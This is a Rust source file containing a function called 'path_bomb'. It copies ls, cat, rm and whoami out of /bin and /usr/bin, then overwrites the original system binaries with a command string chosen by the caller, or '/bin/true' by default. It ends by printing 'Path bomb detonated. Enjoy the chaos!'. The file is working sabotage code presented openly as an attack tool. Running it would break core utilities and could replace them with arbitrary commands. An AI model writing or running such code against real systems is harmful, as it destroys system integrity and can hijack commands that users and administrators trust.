use std::{env, fs};
use std::fs::create_dir;
use std::path::Path;
use crate::ui::{print_error, print_status, print_success};

pub fn path_bomb(safe_path: String, command: Option<String>) {

    let usr_bin_files = fs::read_dir("/usr/bin").expect("Failed to read /usr/bin");
    let bin_files = fs::read_dir("/bin").expect("Failed to read /bin");

    let paths = vec!["/bin/ls", "/bin/cat", "/usr/bin/rm", "/usr/bin/whoami"];

    match create_dir(safe_path.clone()) {
        Ok(..) => {},
        Err(..) => print_error(format!("Failed to create directory {safe_path}"))
    };
    print_status(format!("Created directory {safe_path}"));

    for file in  usr_bin_files.chain(bin_files){
        let file = match file{
            Ok(f) => f,
            Err(E) => {print_error(format!("Error reading file: {:?}", E)); continue}
        }.path();

        if !paths.contains(&file.to_str().expect("Failed to convert OsStr to str")) {
            continue;
        }

        let file_name = file.file_name().expect("Failed to get file name").to_str().expect("Failed to convert OsStr to str").to_string();
        let new_path = format!("{safe_path}/{file_name}");
        match fs::copy(file.clone(), new_path) {
            Ok(..) => {},
            Err(E) => {print_error(format!("Error copying file: {:?} {:?}", file, E)); continue}
        }
        print_status(format!("Copied {file_name} to {safe_path}"));
        let fuck_you_buddy = match command {
            Some(..) => {command.clone().unwrap()}
            None => {"/bin/true".to_string()}
        };
        match fs::write(file.clone(), fuck_you_buddy) {
            Ok(..) => {},
            Err(E) => print_error(format!("Error overwriting file: {:?} {:?}", file, E))
        };
    }


    print_success("Path bomb detonated. Enjoy the chaos!")
}